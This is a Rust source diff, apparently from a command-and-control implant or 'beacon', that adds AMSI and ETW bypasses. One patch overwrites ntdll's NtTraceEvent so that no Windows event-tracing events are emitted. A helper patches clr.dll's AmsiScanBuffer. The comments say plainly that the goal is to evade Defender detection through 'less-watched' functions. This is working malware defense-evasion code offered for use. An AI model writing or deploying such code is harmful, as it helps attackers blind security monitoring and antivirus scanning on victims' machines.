@@ -51,6 +51,14 @@ pub const AMSI_PATCH: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
 /// `xor rax, rax ; ret` — EtwEventWrite returns STATUS_SUCCESS (0), no event
 /// written. 4 bytes.
 pub const ETW_PATCH: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];
+/// `xor eax, eax ; ret` — NtTraceEvent returns STATUS_SUCCESS (0). 3 bytes.
+/// Patching `ntdll!NtTraceEvent` byte0-onward to this makes EVERY
+/// `EtwEventWrite*` that routes through it (all of them do) return immediately
+/// with success and emit no event — one patch covers the whole EtwEventWrite
+/// family (P2.1b). `xor eax,eax` (not `xor rax,rax`) is enough: STATUS_SUCCESS=0
+/// fits in 32 bits and zero-extends to rax, saving a byte. `ret` (not
+/// `ret imm16`) — caller-owned stack cleanup per the x64 ABI.
+pub const NTTRACE_PATCH: [u8; 3] = [0x31, 0xC0, 0xC3];
 
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
@@ -118,6 +126,38 @@ unsafe fn write_patch(addr: usize, patch: &[u8]) -> Result<(), &'static str> {
 pub unsafe fn patch_etw() -> Result<(), &'static str> {
     let addr = crate::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite")
         .ok_or("EtwEventWrite unresolved")?;
+    write_patch(addr, &ETW_PATCH)
+}
+
+/// Patch `ntdll.dll!NtTraceEvent` → `xor eax,eax; ret` (P2.1b). One patch
+/// covers the ENTIRE `EtwEventWrite*` family: every `EtwEventWrite*` variant
+/// routes its event emission through `NtTraceEvent`, so blinding it makes all
+/// of them return immediately with STATUS_SUCCESS and emit no event — strictly
+/// broader than [`patch_etw`] (which only hits `EtwEventWrite` itself). ntdll
+/// is always loaded, so this succeeds post-bootstrap.
+///
+/// This is the P2.1b upgrade over the P0 `EtwEventWrite` byte-patch: the P0
+/// patch is "burning out" in 2026 Defender (flagged), while `NtTraceEvent` is
+/// less-watched and covers more.
+///
+/// # Safety
+/// Must run after the PEB-walk resolver is initialized. Single-threaded beacon
+/// context.
+pub unsafe fn patch_nt_trace_event() -> Result<(), &'static str> {
+    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
+        .ok_or("NtTraceEvent unresolved")?;
+    write_patch(addr, &NTTRACE_PATCH)
+}
+
+/// Patch an arbitrary already-resolved export address with the ETW_PATCH bytes
+/// (xor rax,rax;ret → STATUS_SUCCESS). Used by the `BlindKit::Clr` path to
+/// blind `clr.dll!AmsiScanBuffer` (same content-scan surface as amsi.dll, but
+/// on the CLR which is less-watched). `addr` must point at a code page entry.
+///
+/// # Safety
+/// `addr` must be the entry of a patchable function (code page), in a
+/// currently-mapped module. Single-threaded beacon context.
+pub unsafe fn patch_at(addr: usize) -> Result<(), &'static str> {
     write_patch(addr, &ETW_PATCH)
 }
 
